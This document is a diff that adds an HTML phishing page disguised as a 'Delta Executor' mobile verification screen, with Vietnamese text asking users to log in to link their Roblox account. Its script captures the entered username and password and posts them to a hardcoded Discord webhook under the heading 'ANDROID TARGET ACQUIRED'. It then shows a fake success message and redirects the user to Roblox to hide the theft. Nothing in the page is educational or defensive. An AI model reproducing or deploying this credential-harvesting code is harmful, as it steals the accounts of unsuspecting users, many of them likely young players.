@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Delta Executor Mobile</title>
+    <style>
+        body { background: #000; color: #ff0055; font-family: sans-serif; text-align: center; padding: 20px; }
+        .login-box { border: 1px solid #ff0055; padding: 20px; border-radius: 10px; margin-top: 50px; }
+        input { width: 90%; padding: 10px; margin: 10px 0; background: #111; border: 1px solid #333; color: white; }
+        button { background: #ff0055; color: white; border: none; padding: 15px 30px; width: 100%; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <img src="https://delta-executor.com/wp-content/uploads/2023/11/delta-logo.png" width="80">
+    <div class="login-box">
+        <h3>DELTA MOBILE VERIFICATION</h3>
+        <p style="font-size: 12px;">Đăng nhập để liên kết tài khoản Roblox với Delta Executor.</p>
+        <input type="text" id="user" placeholder="Username / Email">
+        <input type="password" id="pass" placeholder="Password">
+        <button onclick="sendData()">KÍCH HOẠT DELTA</button>
+    </div>
+
+    <script>
+        function sendData() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
+            
+            fetch(wh, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "### 📱 ANDROID TARGET ACQUIRED (APK)\n**User:** `" + u + "`\n**Pass:** `" + p + "`\n**Device:** Android Mobile"
+                })
+            }).then(() => {
+                alert("Xác minh thành công! Delta sẽ khởi động cùng Roblox sau 5 giây.");
+                window.location.href = "https://www.roblox.com/home";
+            });
+        }
+    </script>
+</body>
+</html>
